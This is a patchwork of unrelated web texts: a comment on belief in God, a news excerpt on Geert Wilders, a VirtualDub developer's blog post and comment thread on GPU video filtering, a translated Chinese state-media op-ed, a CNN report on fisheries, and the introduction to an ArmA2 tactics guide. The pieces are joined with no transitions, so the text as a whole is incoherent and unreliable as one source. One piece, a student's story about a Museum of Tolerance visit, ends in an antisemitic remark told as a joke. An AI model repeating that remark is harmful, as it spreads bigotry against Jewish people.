All right , I ’ll stop now , I promise .
But my point remains .
Going around and arbitrarily slapping labels of dogma and reason according to one ’s personal opinion rather than the weight of tangible evidence behind the object or idea being slapped with that label , is perhaps one of the highest forms of intellectual laziness .
As a person with a scientific mindset , I have absolutely no problem with the idea of a deity .
I just need proof .
And not all the fluff we typically hear about how God is in the laughter of children ( that ’s endorphins ) or in the greenness of a blade of grass ( that ’s chlorophyll ) but something we could confirm and analyze .
Until then , all they have is faith and that does n’t have enough weight in the objective world .

Exit polls show the notoriously anti-immigrant Dutch politician Geert Wilders gaining 15 percent of the vote and second place in elections for the European Parliament in the Netherlands — even as he faces prosecution on charges of inciting hatred in his speeches .
The Guardian :
The Dutch anti-immigrant maverick , Geert Wilders , scored his biggest victory yesterday , seizing 15 % and second place in European elections for the Netherlands , according to exit polls last night .
The bleached blond populist , barred from Britain and facing prosecution at home for hate speech , led his Freedom party to win four of the Netherlands ’ 25 seats in the European parliament at the first attempt , pushing the Labour party of the coalition government ’s finance minister , Wouter Bos , into third place .
Wilders wants the European parliament abolished , Bulgaria and Romania kicked out of the EU , the mass deportation of immigrants from the Netherlands , and a minimum say for Brussels over Dutch policy .
The virulence of his anti-Islam and anti-immigrant activities saw him barred from entering Britain earlier this year , while the Dutch authorities are prosecuting him for inciting hatred .

The lesson here appears to be that it is n't necessarily a given that the GPU will beat the CPU , even if you 're doing something that seems GPU - friendly like image processing , and particularly if you 're on a laptop where the GPUs tend to be a bit underpowered .
That probably explains why we have n't seen a huge explosion of GPU - accelerated apps yet , although they do exist and are increasing in number .
There are , of course , a ton of caveats in these numbers , such as memory bandwidth and the relationship between theoretical peak ops and pixel throughput .
The Quadro , for instance , is only about half as fast as the GeForce in real - world benchmarks .
Still , it 's plausible that the CPU is n't at a disadvantage here , particularly when you consider the extra overhead in uploading and downloading frames and that some fraction of the GPU power is already used for display .
I need to try a faster video card , but I do n't really need one for anything else , and more importantly , I no longer have a working desktop .
But then again , I could also get a faster CPU ... or more cores .
I currently have five filters accelerated : invert , deinterlace ( yadif ) , resize , blur , blur more , and warp sharp .
At full load , five out of the six are faster on the CPU by about 20 - 30 % , and I cheated on warp sharp by implementing bilinear sampling on the GPU instead of bicubic .
Part of the reason is that the CPU has less of a disadvantage on these algorithms : when dealing with 8 - bit data using SSE2 it has 2 - 4 x bandwidth than with 32 - bit float data , since the narrower data types have 2 - 4 x more parallelism in 128 - bit registers .
The GPU 's texture cache also is n't as advantageous when the algorithm simply walks regularly over the source buffers .
Finally , the systems I have for testing are a bit lopsided in terms of GPU vs. CPU power .
For instance , take the back - of - the - envelope calculations for the secondary system :
There are only two ways to download non-trivial quantities of data from the video card in Direct3D 9 , which are ( 1 ) GetRenderTargetData ( ) and ( 2 ) lock and copy .
In terms of speed , the two methods are slow and pathetically slow , respectively .
GetRenderTargetData( ) is by far the preferred method nowadays as it is decently well optimized to copy down 500 MB / sec+ on any decent graphics card .
The problem is that it is impossible to keep the CPU and GPU smoothly running in parallel if you use it , because it blocks the CPU until the GPU completes all outstanding commands .
The result is that you spend far more time blocking on the GPU than actually doing the download and your effective throughput drops .
The popular suggestion is to double - buffer render target and readback surface pairs , and as far as I can tell this does n't help because you 'll still stall on any new commands that are issued even if they go to a different render target .
This means that the only way to keep the GPU busy is to sit on it with the CPU until it becomes idle , issue a single readback , and then immediately issue more commands .
That sucks , and to circumvent it I 'm going to have to implement another back end to see if another platform API is faster at readbacks .
On top of this are a 3D portability layer , then the filter acceleration layer ( VDXA ) .
The API for the low level layer is designed so that it could be retargeted to Direct3D 9Ex , D3D10 and OpenGL ; the VDXA layer is much more heavily restricted in feature set , but also adds easier to use 2D abstractions on top .
The filter system in turn has been extended so that it inserts filters as necessary to upload or download frames from the accelerator and can initiate RGB <-> YUV conversions on the graphics device .
So far , so good ...
I 've gotten to a stable enough point that I feel comfortable in revealing what I 've been working on lately , which is GPU acceleration for video filters in VirtualDub .
This is something I 've been wanting to try for a while .
I hacked a video filter to do it a while back , but it had the severe problems of ( a ) only supporting RGB32 , and ( b ) being forced to upload and download immediately around each instance .
The work I 've been doing in the past year to support YCbCr processing and to decouple the video filters from each other cleaned up the filter system enough that I could actually put in GPU acceleration without significantly increasing the entropy of the code base .

Download from gpu could be overlapped with the compression of the previous frame , and I do n't really know why but CopyResource of dx10 is a lot faster than GetRenderTargetData in dx9 .
Gabest - 27 05 09 - 03:38
But in general , writing a fast GPU shader is much easier and clearer than writing optimized assembly to do the same thing .
I 'll take the faster development time for the same performance in a heartbeat .
And , of course , if there are no blocking frame dependencies , paralellizing CPU and GPU filters across frames would let each do what they 're better at .
And once you have an algorithm that needs to operate in floating - point internally , or has texture access patterns less friendly to the CPU ...
Glenn Maynard - 27 05 09 - 03:39
Another idea : lock and copy with sse4's movntdqa , if I understand it correctly this instruction was made exactly for that task , but they are probably already using it deep inside GetRenderTargetData ^_^
Gabest - 27 05 09 - 03:45
... and to add something to the gpu vs cpu debate , I 'm a bit disappointed that AVX only extends the ISA to floats and larrabee 's smallest data unit will be 32 bit.
16 bit per color component would double the bandwidth for free , but they only like floating point nowdays .
Gabest - 27 05 09 - 03:53
Have you also investigated using systems like CUDA instead ?
They seem more suited to this task , but support has been a bit flaky when I last looked at them ( a few years back ) .
sagacity - 27 05 09 - 03:55
CUDA has a number of different optimized asynchronous data streaming options , you might want to investigate them .
( You can easily combine CUDA & DX ) Of course , if your hoping to be GPU / CPU independent maybe waiting for OpenCL might be a better plan .
( Any minute now ...
AMD&nVIDIA both have dev. drivers available ( CPU / GPU ) ) .
Comparing those old GPU performances is n't really a great comparison either , you 'll find the new generation of GPUs will far out perform the CPU for image processing operations , even with the data copying overheads .
Adrian - 27 05 09 - 04:01
Amusingly in games people are working on switching back from GPU processing to other types of processing .
CUDA filters can be faster than normal GPU filters , and will be much faster on future CUDA hardware .
On the PS3 , SPU filters are way faster than RSX filters .
On LRB , filters designed to run as x86 code will be way faster than filters that are written as GPU shaders .
The shader model is just not well designed for filter - like operations .
For my product Oodle I 'll be providing some filter - like ops that can run either as CPU code in little work fibers , or as GPGPU code on hardware .
I 'm guessing that most people on modern CPUs like Core i7 will have more free CPU cycles than GPU cycles .
cb - 27 05 09 - 12:30
I agree that it 's easier to make a decently optimized shader than a CPU routine , which is one of the reasons I 'm investigating this path .
If possible , I 'd like to support CPU emulation as well .
One thing I 'm finding , though , is that debugging the shaders is harder .
NVPerfHUD does n't work on my primary machine , so I 'm forced to use PIX , and debugging a shader with PIX is a lot more annoying than debugging CPU code with Visual Studio .
I find pixel shader debugging in Visual Studio to be almost useless since you have to use refrast and you can't select the pixel you want to debug .
I disagree that shaders are a poor fit for filters -- they 're a very good fit for convolution filters , which can implement a wide variety of processing algorithms .
The main thing missing is the ability to apply a texel offset in the shader instead of having to pass 1/w and 1/h directly .
I believe the Xbox 360 has this via a tex2DOffset ( ) intrinsic in its xps_3_0 profile .
Problems with CUDA , from what I can tell so far :- NVIDIA only . - GeForce 8 and up only .-
Opaque compiled format , which would make it impossible to retarget CUDA filters to any other API .- Debugging problems .
You can recompile a CUDA kernel to run on the CPU , but the documentation says this is only possible with the high level API , and I would probably have to use the low level API .- Undefined threading model .
I need to be able to start and stop the acceleration engine on a worker thread and it may not be the same thread each time .
Whether or not it would be faster than a pixel shader depends on whether the texture unit is the bottleneck .
Faster readback would be nice , but is less important if the GPU ceases to be the bottleneck ( I can poll events to prevent the readback from stalling the CPU , limiting the problem to synchronization ) .
OpenCL looks more interesting , but it is n't widely available yet .
NVIDIA 's implementation is still in closed beta .
It also looks like the program model for non-embedded systems is source , which is scary .
Because the plan is to export this to the plugin API , the requirements are significantly tighter than for VirtualDub itself : I need an API that is widely available , easy to program , and that will have a long lifetime .
Asking plugin authors to write their algorithm six times and test it on five machines is not an option , nor do I want to deal with filter chains that have filters using five different acceleration APIs .

While I was working in a completely different area ( and used CUDA ) , my experience was that the GPU is _only_ faster because ( i.e. when ) it has a vastly higher memory bandwidth ( at much higher latency though , that 's why you need obscene amounts of parallelism ) .
Why ?
Because if the calculation is complex you often do n't get the parallelism you need or waste performance in some other way for the GPU implementation , particularly if you can't use the hardware as efficiently because you are using shaders and not CUDA ( do I understand you right you even have to use floats and can't do calculations on byte arrays ? ) .
If the calculation is simple , the CPU definitely is bound by the memory bandwidth .
So if you have the kind of laptop GPU that uses the main memory , it 's usually completely useless .
And even the " proper " GPUs in laptops often will have a scaled - down memory connection .
Now just in case the memory bandwidth is the issue you now have the additional issue that upload and re-reading the image from the graphics card can already use up as much memory bandwidth as calculating the filter on the CPU .
Even though my project was ( mostly ) successful , I think it is a really thin line of algorithms where the GPU can be used _really_ successfully .
Reimar - 03 06 09 - 06:26
Not sure I agree , because the GPU really does have a lot of compute bandwidth ... when dealing with 32 - bit floats .
Where it gets screwed is when you 're dealing with smaller quantities .
As far as I can tell from the CUDA and PTX documentation , and what I know about the GeForce 8 architecture , dealing with quantities smaller than 32 - bit only has one benefit , and that 's memory bandwidth .
The ALUs are all scalar and do n't work with widths below 32 - bit -- the best you can get is to work with 16 - bit ints and even then you 're still only working on one value at a time .
You can load bytes and words , but not work on them any faster .
That means that when the compute width drops to bytes , the CPU suddenly gets a 4 x boost because it can slice its ALUs and the GPU can't .
The CPU also appears to have other interesting advantages in this area .
I use averaging a lot at the byte level , which is implemented in modern CPUs for MPEG prediction and executes extremely fast since it 's just a perversion of the adder ; on the GPU , you have to emulate it with add / mul / mad ops instead and can end up slightly behind .
CUDA has the advantage of a sane and asynchronous readback API , an easier programming model , on - chip mutable storage , and direct linear memory access .
Fragment programs ( pixel shaders ) , on the other hand , might have access to a ROP that CUDA programs do n't , with free packing in particular being potentially lucrative .
I think what it comes down to is whether the texture units are a bottleneck that can be overcome with CUDA direct memory access , which can pull contiguous memory very quickly .
Compute - wise I do n't see a difference .
I have n't played around with CUDA enough to be able to tell , but one thing 's becoming clear : it 'll be more of a pain due to the alignment requirements ( esp. compute model pre-1.2 ) .
Problems dealing with edge conditions also resurface , which is otherwise very nicely handled by the texture unit , and one of the biggest PITAs I have to deal with when writing CPU routines .
One thing that I noticed is that on the GeForce 8 , most integer ops seem to run at full speed compared to FP equivalents .
That means SWAR tricks for doing narrow integer 2 - vectors or 4 - vectors in 32 - bit integer math become potentially lucrative .
Unfortunately , with 32 - bit ALUs , it 's not that interesting ; averaging 4x8 , for instance , takes four ops and is a wash .
I seem to recall that ATI relegates more integer ops to scarce units , too , so doing this in DX10 is probably a good way to really tank a bunch of graphics cards .

First , when I used it the readback API of CUDA was not that sane , you either had to add explicit sleeps or it would do busy - waiting for the GPU to complete .
Probably still better than what you have to use for shaders but still rather annoying when there 's work to do for the CPU .
And I hope I never claimed that using byte - wise calculation / CUDA would improve calculation speed ( though they would for operations like shifts , xor , and , or etc. , the kind of thing that is SIMD - able with pure C types and code ) .
My argument was about memory bandwidth .
Though I just realize that this might be nonsense , since shaders can read from 8 - bit - per - component textures and write to framebuffers in such a format .
Having shared memory directly accessible might still help , and IMO eliminates most problems due to alignment requirements .
I also think the alignment requirements do not exist when you go through the texture cache , i.e. using texture reads ( which also fixes you edge conditions ) .
To be honest , to me that seemed like the only good use for the texture cache , the texture cache has the same latency and bandwidth as the main memory - at least on the bigger cards .
Well , and maybe when you can't figure out how to use the shared memory efficiently for caching .

I would n't touch CUDA with 10 foot pole -- I am sick of proprietary closed APIs which do n't work on all hardware .
On the other hand writing a filter for CPU guarantees that it will work on Larrabee .
What pisses me off is that not a single video codec author has n'r recognized the oportunity to add a hook for deinterlacing into encoding pipeline so we do n't have to do motion estimation twice and that nobody considered offloading motion estimation for encoding to the GPU .

Your comment that " I disagree that shaders are a poor fit for filters -- they 're a very good fit for convolution filters , which can implement a wide variety of processing algorithms " has just given me a completely insane idea for a project I 've been thinking about .
For a while now I 've been toying with the idea of capturing the output from a Gamecube or a Wii on my computer and then writing a program that controls the console based on the video output ( possibly by then getting the computer to pretend to be a cube / wii controller ) .
I was going to just grab the video with a TV card and then process it on the CPU , but given that I 'm mainly going to be looking for patterns ( and if I remember my Computer Vision course right , convolution is a good way to do that ) , I 've just had the idea of using a graphics card with onboard video capture .
The idea is that the onboard capture chip dumps the video straight into the video memory , where I can then run shaders on it looking for whatever pattern I 'm after .
I then just read the result off the card ( most likely a greyscale texture ) , and use as the input to whatever console - controlling program I end up with .
The only trouble is the only card I have with onboard capture is a GeForce 4 .
In any case , it 's a completely insane idea and so must be tried !
Torkell ( link ) - 26 06 09 - 18:38
One problem with doing that is that I do n't know of a way to get capture data directly into a place where CUDA or a shader could access it .
The hardware is almost certainly capable of doing it , even if the capture device is separate , but the OS and APIs do n't allow it .
Well , at least on Windows .
Linux and V4L might .
Is the key to resolving the world 's most
vexing problems to follow what is known
as the ' harmonious middle way ' of China's
ancient Book of Changes ?
Global Geographic Times , Peoples ' Republic of China
For Humanity 's Sake , Put an End to Western Hegemony
Is the very nature of Western civilization at the heart of the global financial crisis , the Iraq War , and the failure of Western culture to take hold in much of the world ?
According to Zhang Wei , the writer of this article from China 's state - controlled Global Geographic Times , the Occident had better learn to adopt what is good from other cultures , particularly China 's - otherwise the West's ' me - first - ism ' could bring disaster upon humanity .

People 's Republic of China - Global Geographic Times - Original Article ( Chinese )
The words of the Book of Changes carved in stone between A.D. 172 and 178 by the first emperor of the Qin Dynasty , Qin Shi-huang .
Could these words be a key to the problems confronting humanity today ?
BBC NEWSNIGHT : Special report from 1989 on the changing face of China and how that nation has integrated socialism and capitalism , 00:13:50
Western culture has its strong points , but also its weaknesses - perhaps its greatest weakness being its tendency toward haughtiness .
It lacks the Chinese idea of a " harmonious middle way . "
Some Westerners believe that human history will eventually fall completely into a Western pattern and that in the future , the West will unquestionably lead the world .
The truth is that any religion , theory , or ideology - including democracy and market capitalism - once it's pushed to the extreme and regarded as fundamental to all else , triggers an irrational response by its followers .
The outcome of this is never good , and is often crushing defeat .
That is the position the West confronts today , with the plight of the Iraq War , the failure of the " color revolutions " and the financial tsunami .
How can world history possibly end up following the Western model ?
Developing countries that choose to imitate the West have seen almost all their attempts fail .
The world 's peoples continue to explore and test alternatives to development , and humanity 's exploration of the political future is far from exhausted .
The West bears its own heavy responsibility to reform itself - otherwise , how could we have had the bankruptcy of Iceland and the financial corruption at the highest levels of America , and on top of that , such a serious economic crisis ?
Posted by WORLDMEETS.US
Insightful people in the West are in a state of profound reflection over these questions .
People like Britain 's former culture minister Chris Smith and writer Richard Cork , author of the article Western Civilization is Confronted with a Severe Choice [ translated headline and quotes ] .
As he points out : " Western civilization has arrived at a crossroads .
One road leads to a resentment of the world , aggression , indifference , neo - conservatism and violent liberalism .
And the other road ... to the building up of oneself through diligent striving , optimism , rationality , sympathy , equality , and a coherent , mutually - affirming society . "
It so happens that this other road coincides with the idea of the " harmonious middle way " advocated by the Chinese .
If the major powers of the West can reflect on themselves in this manner , the future of humanity could be a much brighter one ; otherwise the world 's differing civilizations will be put on an even sharper collision course .
We can not lower our guard to this .
The struggle for harmony may be against the current trend of history , but it is something we must pursue .
The concept of the Chinese " harmonious middle way " can be traced back to the pre-Confucian , Book of Changes .
It is generally believed that the very idea of " harmony " is derived from the metaphor of the " middle way . "
Taking the " harmonious middle way " does not imply the passive acceptance of a negative compromise , but the " seeking of common ground while reserving minor differences " to achieve " cordial friendship without sacrificing principles . "
These ideas are what allowed China to avoid Europe 's millennium of continuous religious war - war which came close to destroying Western civilization .
Looking back at the success China has enjoyed over the past 30 years , its central characteristics have been rationality and prudence in following a middle path , rather than prejudice and extremism .
This is what has allowed China 's rapid rise .
Of course , this rise has brought with it new contradictions and questions , yet the majority of Chinese people think these too should be solved through the " harmonious middle way . "
It 's like opening a door : the door can be pushed open , or pulled open .
Western culture is accustomed to " pushing , " emphasizing the discrepancies and contentiousness among various interest groups and a preference for the philosophy of struggle .
Chinese culture , on the other hand , is accustomed to " pulling , " emphasizing the symbiosis and integration of divergent interests , advocating a philosophy of harmony , and always looking toward practical solutions to problems .
The model of Western culture has an extremely low success rate in non-Western countries and its philosophy of struggle has torn a number of countries apart .
Therefore , China will continue on its own path , while drawing upon all of the best methods from others .
With the development of globalization , the problems associated with global governance are increasing by the day - from counter - terrorism to global warming , from environmental management to eradicating poverty , from preventing epidemic disease to reforming the global financial system .
Only if each and every country values peace above all , cooperates fully with its neighbors and makes up for its own deficiencies by learning from the strengths of the others will we be able to confront these challenges .
Although the Berlin Wall has been torn down , there are many other walls ; the wall between poor countries and rich ; between strong countries and weak ; and between religions and different civilizations , the walls have all been getting higher and higher .
This has been largely due to the rising tide of fundamentalist Western democratic and free - market preaching - but also because of the difficulties of the Iraq War and the deepening American economic crisis .
Day by day , people have become increasingly aware of the foolishness of this fundamentalism .
Chinese people today would like to see two ideas influence the world : the " harmonious middle way " and " peace achieved through respect for differences . "

We wish to expose the stupidity of ideological monomania and point out that the West's " me-first-ism " may bring disaster upon humanity .
We must diligently demolish the walls of alienation that exist in today 's world .
Thus we will gain lasting justice , prosperity , and peace for all the world , as well as China .

Today my History class took a feild trip to the Museum of Tolerance .
Its a museum showing kids not to be prejudice and all that good stuff .
< beser >
Anyways , one exhibit is two doors next to each other .
One door has a sign hanging over it saying " Those with prejudice walk through this door "
The other door 's sign said " Those without prejudice walk through this door " .
Obviously the door for people without prejudice is n't openable because as the tour guide says " Everyone has prejudice " .
< beser >
So , I start tugging on the door and say " What the hell is wrong with this damn door , did some damn Jew make this ? " and the tour guide kicked me out and i had to sit in the bus for 15 minutes
( CNN ) -- Efforts to curb overfishing in five of the world 's marine ecosystems are starting to show signs of working .
Many fisheries around the world are dangerously close to collapsing .
The news comes from a multi-national study on the status of marine fisheries and ecosystems reported in " Science " .
While the report found that stock collapse is an increasing international trend , the scientists involved believe there are positive signs that rebuilding the ocean 's depleted fish stocks is possible .
The two year study looked at ten marine ecosystems , evaluating how much marine life was being fished and which management techniques have been used to rebuild depleted stocks .
It is a follow - up to a 2006 paper that highlighted a widespread global trend toward fisheries collapse that led to disagreement among the scientific community .
The study found signs of some stock recovery in waters around the U.S. , Iceland and New Zealand , supporting the argument that well managed fishing can lead to rebuilding fisheries in other parts of the world .
" These highly managed ecosystems are improving " said Ray Hilborn of the University of Washington and one of the report 's lead authors .
" Yet there is still a long way to go : of all fish stocks that we examined sixty - three percent remained below target and still needed to be rebuilt . "
" Across all regions we are still seeing a troubling trend of increasing stock collapse , " said Boris Worm , of Dalhousie University and co-author of the report .
" But this paper shows that our oceans are not a lost cause .
The encouraging result is that exploitation rate -- the ultimate driver of depletion and collapse -- is decreasing in half of the ten systems we examined in detail .
This means that management in those areas is setting the stage for ecological and economic recovery .
It 's only a start , but it gives me hope that we have the ability to bring overfishing under control . "
Most of the marine ecosystems studied were in intensive managed areas in developed countries where the scientists were able to collect regular data .
However , the report also found that often overfishing would move to areas with weaker laws and enforcement .
While most of the fisheries that showed improvement are managed by a few wealthy nations , there are some exceptions .
In Kenya , scientists , managers , and local communities teamed up to close some key areas to fishing and restrict certain types of fishing gear .
According to the study , this led to an increase in the size and amount of fish available -- and an increase in fishers ' incomes .
" These successes are local - but they are inspiring others to follow suit , " says Tim McClanahan of the Wildlife Conservation Society in Kenya .
" We know that more fish can be harvested with less fishing effort and less impact on the environment , if we first slow down and allow over - fished populations to rebuild , " said Jeremy Collie from the University of Rhode Island , another author of the report .
" Scientists and managers in places as different as Iceland and Kenya have been able to reduce overfishing and rebuild fish populations despite serious challenges . "
While the study suggests that closing areas to fishing , banning some types of fishing gear and changing fishing quotas have long - term benefits , they also come with short - term costs to fishers .
" Some places have chosen to end overfishing , " said Trevor Branch from the University of Washington in the report .
" That choice can be painful for fishermen in the short term , but in the long term it benefits fish , fishermen , and our ocean ecosystems as a whole . "
However , " lessons from one spot need to be applied very carefully to a new area , " said co-author Beth Fulton of the CSIRO Wealth from Oceans Flagship in Australia , since " there are no single silver bullet solutions .
Management efforts must be customized to the place and the people . "

This guide is simply one of a kind and I strongly recommend it to everyone who will be sent to Chernarus ! "
" Dslyecxi 's guide is an unbelievably complex , detailed and informative resource , showing many ways how to be more efficient in combat in ARMA II and hopefully also get more enjoyment from the game .
The previous guide was already unique , and it is breathtaking to see it this much improved right on time for the international release of ARMA II .
Updated , Updated Forward
My official Arma 3 Tactical Guide , the successor to this one , has been released !
You can read more about it - which I call TTP3 - here !
Updated Foreward
In the years since the creation of this guide , a great deal of video content has been produced by my group - Shack Tactical - chronicling our gameplay experiences in ArmA2 and Operation Arrowhead .
I have included a sample below from my channel for those who would like to see us applying the TTPs of this guide in our actual gameplay .
If you are interested in more , please feel free to check out and subscribe to my channel - the more interest is shown , the more videos I plan to create .

Intro to the ShackTac ArmA2 TTP2 Guide
Welcome !
Greetings , and welcome to my ArmA2 " Tactics , Techniques , and Procedures " Guide .
I 'd like to take a few minutes to talk about this guide , how it came to be , what 's different between it and my prior guide for ArmA1 , as well as all sorts of other preamble topics .
Please bear with me for a bit - I believe that there are some important things to convey before we dive into the heart of the guide .
Intent First , let 's talk about the intent behind this guide .
This Arma2 " Tactics , Techniques , and Procedures Guide " - henceforth known as " TTP2 " - was created with the intention of following up on the success that my previous ArmA1 guide brought to my gaming group , Shack Tactical .
Having a well - established doctrinal reference for how we conducted ourselves as a group was a major factor in our gaming enjoyment for over two years of playing ArmA1 ( and our OFP1 guide , before that , showed similar success for us ) .
It gave us a common , group - wide understanding of various aspects of how to play , allowed us to easily integrate new players , and generally made things run more smoothly and enjoyably for all involved .
That 's ultimately why I wrote it , and that is again what drove me to update it to what you see here .
Now , as to what inspires me to make it available to everyone , utterly free of charge - that deserves explanation .
I am a strong believer in this style of gaming , and I also very strongly believe that this sort of information should be disseminated as widely as possible in the interest of helping everyone , without bias or restriction , to have a more enjoyable time while playing games like ArmA2 , and not locked away in a private forum where few can read it .
Even when I offered a print version of this guide for A1 , I always kept the free version available .
I have no intention of changing that here .
This guide is available for all who have the time to read it - I offer it up warmly , and hope that everyone can take something from it in some capacity .
A strong community benefits us all , and if this guide helps facilitate that in any capacity , I will consider it to be a great success .
To those of you reading this - if you like it , I would encourage you to spread the word to anyone else that might benefit from it .
Word - of - mouth has always been my favored means of promotion , and anyone is welcome to participate .
Note that this guide is not " the only way to do it " .
It is , however , the way that we ( ShackTac ) do things , and it works exceptionally well for us .
Hopefully you can find a use for these TTPs in your gaming as well .
What 's New & Different
For those of you who read my first guide , let 's talk about what makes this one different .
The primary source of changes and expansions to this guide are the result of having a solid foundation to work from ( TTP1 ) and being able to take all of the myriad lessons we learned throughout our ArmA1 experiences and apply them to the creation of new content , as well as updating the existing content .
The result of these changes shows itself in a variety of ways - content in general is more info - rich as well as more organized and digestible , and important topics like leadership and tactics have received a tremendous amount of additional attention .
That 's not the extent of it , either - every part of the guide has received an overhaul and expansion .
If you 've read the first one , you should find this to be a refreshing and interesting sequel to it .
The first guide ended up as being a bit over 60,000 words in total .
At last count , this new one doubles it at around 120,000 - and I think you will find that it is 120,000 words used in careful moderation to convey a vast amount of information that truly is pertinent and relevant to ArmA2 .
There is no mil - sim " fluff " here .
More on that shortly .
How do you eat an elephant ?
When I sat down to write up my goals for TTP2 , I was struck by how much effort would be required to even come close to doing that vision justice .
At the time , an old saying popped into my head - a question , rather , that mirrored the difficult task that I found myself faced with .
The question was - how do you eat an elephant ?
The answer to that guided me through the writing , and at the end of it all , it turned out even better than I had hoped .
I mention that for those of you who are now faced with the rather daunting task of reading through this .
It 's a big guide - you might as well bookmark it now - and there 's a ton of info to take in .
If you heed the answer to that question , though , you 'll make it through - perhaps not in one sitting , but after a few , you 'll suddenly find yourself done .
How do you eat an elephant ?
It 's simple , really - one bite at a time !
Hope you brought a good appetite .
Reality vs Gaming Milsim & pitfalls
As before , the point of this guide is to convey material that truly is relevant to Shack Tactical 's style of realism - combined - with - fun combat simulation .
This is the sort of information that our players use every session to work as a well - oiled and diverse team .
We have maintained a very practical and pragmatic outlook on " milsim " ( military simulation ) and have taken every measure possible to avoid doing things " because the real military does them " and thus becoming what we call " hardcore milsim " .
In our eyes , that hardcore milsim ( which often simply is referred to as " milsim " in general ) is chock - full of " tactical fluff " that is irrelevant to the games at hand .
This hardcore milsim typically presents itself though excessive rules , regulations , attempted recreations of full military rank structures far beyond what is relevant in the scope of your average ArmA mission , doing things " because the real military does them " regardless of their actual application to the game at hand , and other things that we believe do not have a place in these games .
This guide reflects that mindset as well .
One thing that I noticed back before doing my first guide was that military game guides commonly fell victim to two pitfalls - the first being the recitation of actual military publications , without any attempt to separate the wheat ( info relevant to gaming ) from the chaff ( military or real - world procedures that are irrelevant or not simulated in games ) .
Now , do n't get me wrong - there are many things that can be learned from military publications and field manuals .
This guide benefits heavily from being referenced against a number of such manuals .
However , this is not a recitation of them word - for - word , as that would be pointless .
The information presented here is what is truly relevant to the game , as we have experienced ourselves through our years of gaming .
With that being said , military field manuals and publications can be very interesting reads for people who are into this kind of realism .
With this in mind , I have provided download links for many of the most applicable field manuals .
These are entirely optional , but if you are curious on how the real military does things , or want to know more about a specific subject , I encourage you to download them and check them out .
You can find those linked from the final page .
Another thing that must be kept in mind is that the kind of missions most commonly found in games like ArmA , in the real world , require a massive amount of planning and preparation by well - trained professional military personnel well before the first shot is ever fired .
The goal of groups like mine is to be able to play to the best of our ability without requiring such huge time - sinks in the pre-mission planning - basically , we want to get the best results we can without having to spend hours in advance planning out each operation .
Planning is great , but we strive to keep the initial planning short and sweet - minutes at most - and further develop our plans as we carry out the mission .
After all , as the saying goes , " No plan survives first contact " .
The second pitfall is that of gaminess .
" Gamey " guides are those that are oriented around giving very precise info about things in a fashion that takes advantage of knowledge that would not exist in reality - for example , a list of tanks , their armor values , and the precise ' damage ' values of anti-tank weapons .
These " gamey " guides also tend to give tactics that are meant to exploit the game itself .
I do n't believe in this type of guide , so if that is what you 're fond of , you will need to look elsewhere .
Fun is the Ultimate goal Finally , it is worth reiterating that we are playing games here .
The point is to have fun - in our case , we strive for organized , disciplined fun .
We are not trying to pretend that we 're in the military - many of us have already been there , done that , or are still there and doing that .
We 're in ShackTac and playing ArmA2 to have a good time .
We 're a community of friends , ultimately , and that is far more important than any milsim make - believe ever will be .
This guide is written in that spirit .
A Request For those of you who read this guide , I have one main request - once done , please take a look at the finale page .
In particular , check out the survey there .
A minute of your time in filling out that survey would mean a lot to me - it helps me to evaluate where to take future training materials like this .
You can reach that page via the index , or via the " Next page " link at the end of the final section , Vehicle Usage .
Using this Guide After releasing the first ArmA TTP , I was pleasantly surprised to see that many other groups had an interest in adopting large parts of it for their own group 's usage .
In addition to that , several requests came in for permission to translate it into a slew of languages , many of which were completed whole or in part .
If you are interested in either topic - using it as part of your group 's tactical toolbox , or translating it into another language - please do n't hesitate to contact me at .
Intro to Shack Tactical
Who we are , what we do For those of you reading this who are not familiar with my group , Shack Tactical , and would like a bit of information about us and how this document is tied to us , read on .
Shack Tactical is a gaming group I run that focused on Operation Flashpoint in the past , then moved to Armed Assault , and is now focused on ArmA2 for the future .
The basic guiding principle is that we are interested in developing and maintaining a mature yet fun group that has a common interest in realistic tactical combat simulation .
I 'm sure that many people reading this are familiar with some of our " After Action Reports " and have seen videos of our sessions .
If you have not and are interested , you can find the AAR 's on my articles page , and the videos on my Youtube account .
At the time of this writing , ShackTac has played ArmA1 for over two years , and Operation Flashpoint for over a year prior to that .
In that time , we 've evolved considerably as a group .
All of our evolution has been based upon experience in the games we play - I have tried very hard to avoid introducing elements that are not truly necessary , or would over - complicate things and cause a negative impact on the enjoyment of what at the end of the day is ultimately a game .
We are not all real soldiers ( though many of us , like myself , have served in the military in the past , or are still actively serving ) , and we do not pretend to be .
We do , however , enjoy fighting as a cohesive , skilled , and tactically knowledgeable group of like - minded gamers .
This guide was created to help further our gaming experiences as well as introduce them to the general public , in the hope that it may have even a tiny positive impact on the overall tactical gaming community .
I hope that you all enjoy the material that is presented within this guide .
Many ShackTac members contributed valuable input to it , and as I said , it would not have been possible without the experiences of the group as a whole these past years .
Closing Notes
Before we move on , here are a few notes to close off the intro to this guide and Shack Tactical .
The distinction between tactics applicable vs AI and tactics vs humans are not generally made within this TTP .
Some tactics the AI obviously will not utilize or appropriately react to , whereas human opponents will frequently do them .
To keep things simple , this TTP is written to the higher level - meaning , these tactics are not " gamey " ones that exploit the AI , but rather tactics which can be effectively used in a player - vs - player environment .
It never hurts to assume that the enemy is smarter than they may be , just to be on the safe side .
Due to our emphasis on both styles of play ( adversarial and coop ) , we always err on the side of ' more tactical ' , as we 're frequently being pitted against ourselves , and we know that we can't slack off in such fights if we want to win .

Some of the tactics in this guide are based off of experiences with a more realistic ArmA mod called Advanced Combat Environment ( ACE ) , and may not come into full effect in ArmA2 until the sequel to that mod is released for A2 .
, and may not come into full effect in ArmA2 until the sequel to that mod is released for A2 .
There are many good ideas that are applicable to real - world combat or slower , more methodical turn - based gaming that do not lend themselves to practical implementation with large groups .
I have made every effort to present the various tactics in a way that makes them approachable to even moderately skilled groups .
Intro to ArmA2
What ArmA2 Is
For those of you new to ArmA2 , the basic premise is that it is a military combined - arms simulation with an incredible scope and a second - to - none ability to convey large - scale modern military combat .
In addition to that , it is a fantastically configurable and moddable game - it comes with a robust mission editor and scripting language , and tools are available to allow any manner of units , weapons , vehicles , terrains , etc , to be created for the game .
ArmA2 follow in the footsteps of ArmA1 and Operation Flashpoint to provide the most realistic combined - arms from - the - infantry - up experience around , bar none .
It is a military sandbox environment that can be tailored exactly in accordance to what you want from it .
In addition to that , ArmA2 supports a robust set of multiplayer features .
It has the capability to handle up to a hundred ( or more , with good hardware ) players in a single mission at a time , playing against each other in teams , together against the AI in cooperative scenarios , or any imaginable mix .
The mission design possibilities are almost unlimited - if you can think it up , you can probably make it .
Like ArmA1 and OFP before it , ArmA2 is the game of choice for my group , Shack Tactical .
